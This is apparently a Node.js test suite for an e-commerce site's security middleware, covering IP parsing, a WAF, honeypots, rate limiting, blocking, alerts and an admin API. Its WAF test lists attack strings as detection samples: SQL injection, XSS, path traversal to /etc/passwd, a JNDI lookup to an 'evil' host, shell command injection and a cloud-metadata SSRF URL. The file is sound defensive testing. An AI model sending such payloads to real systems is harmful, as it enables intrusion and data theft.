// Run with:  node --test tests/
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { clientIp, ipKey, isCloudflareIp, isTrustedInfra, normalizeIp } from '../server/security/ip.js';
import { createShield, wafScan, isHoneypot, isScannerUa, securityHeaders } from '../server/security/shield.js';
import { createStore } from '../server/security/store.js';
import { createAlerts } from '../server/security/alerts.js';
import { createAdminApi } from '../server/security/adminApi.js';
import { createIntegrity } from '../server/security/integrity.js';

const quiet = { warn() {}, error() {}, log() {} };
const fakeReq = (headers = {}, remote = '10.0.0.5') => ({ headers, socket: { remoteAddress: remote } });
function makeShield(over = {}) {
  let t = 1_700_000_000_000;
  const clock = { now: () => t, advance: ms => { t += ms; } };
  const events = []; const alertsSeen = [];
  const store = { log: e => events.push(e), saveBlock() {}, removeBlock() {}, loadBlocks: async () => [], loadAllow: async () => [], start() {}, ...(over.store || {}) };
  const alerts = { ipBlocked: a => alertsSeen.push(['ipBlocked', a]), spike: n => alertsSeen.push(['spike', n]), integrity() {} };
  const shield = createShield({ store, alerts, env: { ...(over.env || {}) }, now: clock.now, log: quiet });
  return { shield, clock, events, alertsSeen };
}
// drive the middleware with a fake request; returns { status, nexted, headers }
function run(shield, { url = '/', method = 'GET', ip = '203.0.113.10', ua = 'Mozilla/5.0', headers = {} } = {}) {
  const req = { method, url, originalUrl: url, path: url.split('?')[0], headers: { 'user-agent': ua, 'x-forwarded-for': ip, ...headers }, socket: { remoteAddress: '10.0.0.1' }, get(h) { return this.headers[h.toLowerCase()]; } };
  const out = { status: 200, headers: {}, nexted: false, headersSent: false };
  const res = { setHeader(k, v) { out.headers[k.toLowerCase()] = v; }, set statusCode(v) { out.status = v; }, get statusCode() { return out.status; }, end() { out.headersSent = true; }, get headersSent() { return out.headersSent; } };
  shield.middleware(req, res, () => { out.nexted = true; });
  return { ...out, req };
}

/* ---------------------------- IP handling ---------------------------- */
test('client IP: attacker-prepended X-Forwarded-For entries are ignored', () => {
  const r = clientIp(fakeReq({ 'x-forwarded-for': '6.6.6.6, 198.51.100.7' }));
  assert.equal(r.ip, '198.51.100.7');
});
test('client IP: behind Cloudflare the real visitor is found, Cloudflare edge is skipped', () => {
  const r = clientIp(fakeReq({ 'x-forwarded-for': '198.51.100.7, 172.70.1.2' }));
  assert.equal(r.ip, '198.51.100.7'); assert.equal(r.viaCloudflare, true);
});
test('client IP: CF-Connecting-IP is trusted only if a Cloudflare hop is in the chain', () => {
  const spoof = clientIp(fakeReq({ 'cf-connecting-ip': '1.2.3.4' }, '10.1.1.1'));
  assert.notEqual(spoof.ip, '1.2.3.4');
  const real = clientIp(fakeReq({ 'x-forwarded-for': '172.70.1.2', 'cf-connecting-ip': '198.51.100.9' }, '10.1.1.1'));
  assert.equal(real.ip, '198.51.100.9');
});
test('IP helpers: ranges, ports, v4-mapped, IPv6 /64 grouping', () => {
  assert.ok(isCloudflareIp('104.16.1.1')); assert.ok(isCloudflareIp('2606:4700::1')); assert.ok(!isCloudflareIp('8.8.8.8'));
  assert.ok(isTrustedInfra('10.2.3.4')); assert.ok(isTrustedInfra('::1')); assert.ok(!isTrustedInfra('203.0.113.1'));
  assert.equal(normalizeIp('203.0.113.1:5555'), '203.0.113.1'); assert.equal(normalizeIp('::ffff:203.0.113.1'), '203.0.113.1'); assert.equal(normalizeIp('not-an-ip'), '');
  assert.equal(ipKey('2001:db8:1:2:aaaa::1'), ipKey('2001:db8:1:2:bbbb::9'));
  assert.notEqual(ipKey('2001:db8:1:3::1'), ipKey('2001:db8:1:2::1'));
});

/* ------------------------------- WAF-lite ------------------------------- */
test('WAF flags classic attacks in URL/query', () => {
  const bad = [
    "/api/x?id=1 UNION SELECT password FROM users", "/api/x?id=1' OR '1'='1", '/a?q=1;DROP TABLE orders', '/a?q=<script>alert(1)</script>',
    '/a?q=%3Cscript%3Ealert(1)%3C/script%3E', '/a?u=javascript:alert(1)', '/a?f=../../etc/passwd', '/a/%2e%2e/%2e%2e/secret', '/a?x=${jndi:ldap://evil/a}',
    '/a?x=1%00', '/a?q=1 AND SLEEP(5)', '/a?cmd=;cat /etc/hosts', '/a?u=http://169.254.169.254/latest/meta-data',
  ];
  for (const u of bad) assert.ok(wafScan(u), 'should flag: ' + u);
});
test('WAF does NOT flag the real app URLs or normal shopper searches', () => {
  const ok = [
    '/', '/orders?aba=1', '/orders?aba=cancel', '/checkout?buyNow=1', '/admin/products/123e4567-e89b-12d3-a456-426614174000/edit',
    '/api/aba/config', '/auth/callback?code=4f2a-91bc-ddee&state=abc123', '/search?q=select+your+size', '/search?q=Union+Jack+flag',
    '/product/12?color=red&size=L', '/api/admin/security/events?limit=100&type=waf_sqli', '/assets/index-Bx3k9.js', '/rewards?claim=1', '/search?q=%E1%9E%80%E1%9E%B6%E1%9E%A0%E1%9F%92%E1%9E%9C%E1%9F%81',
  ];
  for (const u of ok) assert.equal(wafScan(u), null, 'false positive: ' + u);
});
test('honeypots and scanner user-agents', () => {
  for (const p of ['/.env', '/.git/config', '/wp-login.php', '/xmlrpc.php', '/phpmyadmin/', '/backup.sql', '/cgi-bin/x', '/api/.env', '/server-status']) assert.ok(isHoneypot(p), p);
  for (const p of ['/', '/admin', '/admin/security', '/orders', '/wallet', '/api/health', '/administrator-guide-not-real-route-ok'.replace('administrator-guide', 'about')]) assert.ok(!isHoneypot(p), p);
  assert.ok(isScannerUa('sqlmap/1.7')); assert.ok(isScannerUa('Mozilla/5.0 (compatible; Nmap Scripting Engine)')); assert.ok(!isScannerUa('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)')); assert.ok(!isScannerUa('curl/8.0'));
});

/* ---------------------------- shield behaviour ---------------------------- */
test('security headers are set and CSP defaults to report-only (cannot break the site)', () => {
  const { shield } = makeShield();
  const r = run(shield, { url: '/', headers: { 'x-forwarded-proto': 'https' } });
  assert.ok(r.nexted);
  assert.equal(r.headers['x-content-type-options'], 'nosniff'); assert.equal(r.headers['x-frame-options'], 'SAMEORIGIN');
  assert.match(r.headers['permissions-policy'], /camera=\(self\)/); assert.match(r.headers['permissions-policy'], /geolocation=\(self\)/);
  assert.match(r.headers['strict-transport-security'], /max-age=\d+/);
  assert.ok(r.headers['content-security-policy-report-only']); assert.equal(r.headers['content-security-policy'], undefined);
  assert.equal(securityHeaders({ CSP_MODE: 'enforce' }).cspHeader, 'Content-Security-Policy');
});
test('honeypot hit blocks the IP immediately and alerts once', () => {
  const { shield, alertsSeen } = makeShield();
  assert.equal(run(shield, { url: '/wp-login.php' }).status, 404);
  const after = run(shield, { url: '/' });
  assert.equal(after.status, 403); assert.ok(!after.nexted); assert.ok(shield.isBlocked('203.0.113.10'));
  assert.equal(alertsSeen.filter(a => a[0] === 'ipBlocked').length, 1);
});
test('other visitors are unaffected when one IP is blocked', () => {
  const { shield } = makeShield();
  run(shield, { url: '/.env', ip: '203.0.113.50' });
  const other = run(shield, { url: '/', ip: '203.0.113.51' });
  assert.ok(other.nexted);
});
test('three injection attempts within the window auto-block; one does not', () => {
  const { shield } = makeShield();
  const bad = "/api/x?id=1 UNION SELECT 1";
  assert.equal(run(shield, { url: bad }).status, 403);
  assert.ok(run(shield, { url: '/' }).nexted, 'single hit must not block normal browsing');
  run(shield, { url: bad }); run(shield, { url: bad });
  assert.equal(run(shield, { url: '/' }).status, 403);
});
test('block durations escalate, expire, and can be lifted by an admin', () => {
  const { shield, clock } = makeShield();
  const ip = '203.0.113.20';
  run(shield, { url: '/.env', ip });
  assert.ok(shield.isBlocked(ip));
  clock.advance(14 * 60000); assert.ok(shield.isBlocked(ip));
  clock.advance(2 * 60000);  assert.ok(!shield.isBlocked(ip), '15 minute first block expires');
  run(shield, { url: '/.env', ip });
  const b = shield.listBlocks().find(x => x.ip === ip);
  assert.equal(b.level, 2); assert.ok(new Date(b.until).getTime() - clock.now() > 59 * 60000, 'second offence is ~1 hour');
  assert.ok(shield.unblock(ip)); assert.ok(run(shield, { url: '/', ip }).nexted);
});
test('rate limiting returns 429 with Retry-After, then escalates to a block for sustained abuse', () => {
  const { shield, clock } = makeShield({ env: { RL_API_PER_MIN: '5' } });
  const ip = '203.0.113.30'; let last;
  for (let i = 0; i < 5; i++) assert.ok(run(shield, { url: '/api/aba/config', ip }).nexted);
  last = run(shield, { url: '/api/aba/config', ip });
  assert.equal(last.status, 429); assert.ok(last.headers['retry-after']);
  for (let i = 0; i < 8; i++) { clock.advance(11000); run(shield, { url: '/api/aba/config', ip }); } // keeps hammering
  assert.ok(shield.isBlocked(ip));
});
test('a legitimate user browsing normally is never limited', () => {
  const { shield } = makeShield();
  for (let i = 0; i < 120; i++) assert.ok(run(shield, { url: i % 3 ? `/assets/a${i}.js` : '/api/aba/config', ip: '203.0.113.40' }).nexted);
});
test('NEVER blocks allow-listed IPs, Cloudflare edges or private proxies (would lock out everyone)', () => {
  const { shield } = makeShield({ env: { ALLOW_IPS: '203.0.113.99' } });
  for (let i = 0; i < 5; i++) { run(shield, { url: '/.env', ip: '203.0.113.99' }); run(shield, { url: '/wp-login.php', ip: '172.70.1.2' }); }
  assert.ok(run(shield, { url: '/', ip: '203.0.113.99' }).nexted);
  assert.equal(shield.block('172.70.1.2', {}), null); assert.equal(shield.block('10.1.2.3', {}), null);
});
test('health check endpoint is never filtered', () => {
  const { shield } = makeShield();
  run(shield, { url: '/.env', ip: '203.0.113.60' });
  assert.ok(run(shield, { url: '/api/health', ip: '203.0.113.60' }).nexted);
});
test('scanner UA and odd HTTP methods are refused', () => {
  const { shield } = makeShield();
  assert.equal(run(shield, { ua: 'sqlmap/1.7', ip: '203.0.113.70' }).status, 403);
  assert.equal(run(shield, { method: 'TRACE', ip: '203.0.113.71' }).status, 405);
});
test('state stays bounded and expires (no memory leak)', () => {
  const { shield, clock } = makeShield();
  for (let i = 0; i < 2000; i++) run(shield, { url: '/api/aba/config', ip: `198.51.${(i >> 8) & 255}.${i & 255}` });
  assert.ok(shield._state.counters.size > 1000);
  clock.advance(5 * 60000); shield._sweep();
  assert.equal(shield._state.counters.size, 0);
});
test('fails open: a crashing store can never take the site down', () => {
  const { shield } = makeShield({ store: { log() { throw new Error('db exploded'); } } });
  const r = run(shield, { url: '/', ip: '203.0.113.80' });
  assert.ok(r.nexted);
});
test('restores persisted blocks and allowlist at start-up', async () => {
  const until = new Date(Date.now() + 3600000).toISOString();
  const { shield } = makeShield({ store: { loadBlocks: async () => [{ ip: '203.0.113.90', reason: 'x', level: 2, blocked_until: until }], loadAllow: async () => [{ ip: '203.0.113.91' }] } });
  await shield.init();
  assert.ok(shield.isBlocked('203.0.113.90')); assert.ok(shield.isAllowed('203.0.113.91'));
});

/* ------------------------------ store & alerts ------------------------------ */
test('store de-duplicates repeated events and caps log flooding', () => {
  let t = 1000; const saved = [];
  const store = createStore({ sb: async (p, i) => { saved.push(JSON.parse(i.body)); }, enabled: true, now: () => t, log: quiet });
  for (let i = 0; i < 500; i++) store.log({ ip: '203.0.113.1', type: 'rate_limit' });
  for (let i = 0; i < 400; i++) store.log({ ip: `198.51.${i >> 8}.${i & 255}`, type: 'honeypot' });
  return store.flush().then(async () => { await store.flush(); await store.flush(); await store.flush();
    const rows = saved.flat();
    assert.ok(rows.length <= 240, 'at most 240 rows/minute are written, got ' + rows.length);
    assert.equal(rows.find(r => r.type === 'rate_limit').count, 500, 'repeats are aggregated into one row');
    store.stop(); });
});
test('store keeps working from memory when the database is unreachable', async () => {
  const store = createStore({ sb: async () => { throw new Error('down'); }, enabled: true, log: quiet });
  store.log({ ip: '203.0.113.2', type: 'honeypot' });
  await store.flush();
  assert.equal(store.state.dbOk, false);
  const rows = await store.queryEvents({ limit: 10 });
  assert.equal(rows[0].type, 'honeypot'); store.stop();
});
test('alerts are throttled so an attack cannot flood the admin phone', () => {
  let t = 0; const sent = [];
  const a = createAlerts({ notify: (title, msg) => sent.push(msg), now: () => t, log: quiet });
  for (let i = 0; i < 50; i++) a.ipBlocked({ ip: `203.0.113.${i}`, reason: 'honeypot', minutes: 15 });
  assert.equal(sent.length, 1);
  t += 6 * 60000; a.ipBlocked({ ip: '203.0.113.200', reason: 'x', minutes: 15 });
  assert.equal(sent.length, 2); assert.match(sent[1], /\+49 similar/);
});

/* ------------------------------ admin API ------------------------------ */
function adminHarness({ role = 'admin', user = { id: 'user-1', email: 'a@b.c' } } = {}) {
  const { shield, events } = makeShield();
  const store = { log: e => events.push(e), queryEvents: async () => [
      { created_at: new Date().toISOString(), ip: '203.0.113.5', type: 'honeypot', severity: 'high', action: 'blocked', count: 2 },
      { created_at: new Date().toISOString(), ip: '203.0.113.5', type: 'waf_sqli', severity: 'medium', action: 'blocked', count: 1 }],
    getSetting: async (_k, d) => d, setSetting: async () => {}, saveAllow: async () => {}, removeAllow: async () => {}, state: { dbOk: true } };
  const api = createAdminApi({ shield, store, sb: async () => [{ role }], userFromToken: async req => (req.headers.authorization ? user : null), log: quiet });
  const server = http.createServer((req, res) => { req.sec = { ip: '198.51.100.1' }; api.handler(req, res, () => { res.statusCode = 404; res.end('next'); }); });
  return new Promise(r => server.listen(0, '127.0.0.1', () => r({ base: `http://127.0.0.1:${server.address().port}`, server, shield, events })));
}
test('admin API: anonymous -> 401, customer -> 403, admin -> data', async () => {
  const anon = await adminHarness(); let r = await fetch(anon.base + '/api/admin/security/summary'); assert.equal(r.status, 401); anon.server.close();
  const cust = await adminHarness({ role: 'customer' }); r = await fetch(cust.base + '/api/admin/security/summary', { headers: { authorization: 'Bearer x' } }); assert.equal(r.status, 403); cust.server.close();
  const adm = await adminHarness(); r = await fetch(adm.base + '/api/admin/security/summary', { headers: { authorization: 'Bearer x' } });
  assert.equal(r.status, 200); const j = await r.json();
  assert.equal(j.totals.blockedRequests, 3); assert.equal(j.topIps[0].ip, '203.0.113.5'); assert.equal(j.timeline.length, 24); adm.server.close();
});
test('admin API: block / unblock / validation / self-lockout protection', async () => {
  const h = await adminHarness(); const H = { authorization: 'Bearer x', 'content-type': 'application/json' };
  const post = (p, b) => fetch(h.base + '/api/admin/security' + p, { method: 'POST', headers: H, body: JSON.stringify(b) });
  assert.equal((await post('/block', { ip: 'not-an-ip' })).status, 400);
  assert.equal((await post('/block', { ip: '198.51.100.1' })).status, 400, 'cannot block your own IP');
  assert.equal((await post('/block', { ip: '203.0.113.77', minutes: 30, reason: 'test' })).status, 200);
  assert.ok(h.shield.isBlocked('203.0.113.77'));
  assert.equal((await post('/block', { ip: '172.70.1.2' })).status, 400, 'cannot block Cloudflare');
  assert.equal((await post('/unblock', { ip: '203.0.113.77' })).status, 200); assert.ok(!h.shield.isBlocked('203.0.113.77'));
  assert.equal((await post('/settings', { key: 'integrity_mode', value: 'enforce' })).status, 200);
  assert.equal((await post('/settings', { key: 'evil', value: 'x' })).status, 400);
  assert.ok(h.events.some(e => e.type === 'admin_action'), 'admin actions are audited');
  h.server.close();
});
test('admin API: a customer probing it is struck and eventually blocked', async () => {
  const h = await adminHarness({ role: 'customer' });
  const real = h.shield; // requests come from req.sec.ip = 198.51.100.1
  for (let i = 0; i < 3; i++) await fetch(h.base + '/api/admin/security/summary', { headers: { authorization: 'Bearer x' } });
  assert.ok(real.isBlocked('198.51.100.1')); h.server.close();
});

/* ------------------------------ order integrity ------------------------------ */
test('integrity: report mode never blocks, enforce mode blocks; missing SQL function fails open', async () => {
  let mode = 'report'; const logged = []; const seen = [];
  const store = { getSetting: async () => mode, log: e => logged.push(e) };
  const alerts = { integrity: (...a) => seen.push(a) };
  const bad = createIntegrity({ sb: async () => ({ ok: false, reason: 'price_tampered' }), store, alerts, log: quiet });
  assert.equal((await bad.check({ id: 'o1' })).ok, true); assert.equal(logged.length, 1); assert.equal(seen.length, 1);
  mode = 'enforce'; assert.equal((await bad.check({ id: 'o1' })).ok, false);
  const good = createIntegrity({ sb: async () => ({ ok: true }), store, alerts, log: quiet }); assert.equal((await good.check({ id: 'o2' })).ok, true);
  const missing = createIntegrity({ sb: async () => { throw new Error('404 function not found'); }, store, alerts, log: quiet });
  const r = await missing.check({ id: 'o3' }); assert.equal(r.ok, true); assert.equal(r.skipped, true);
});
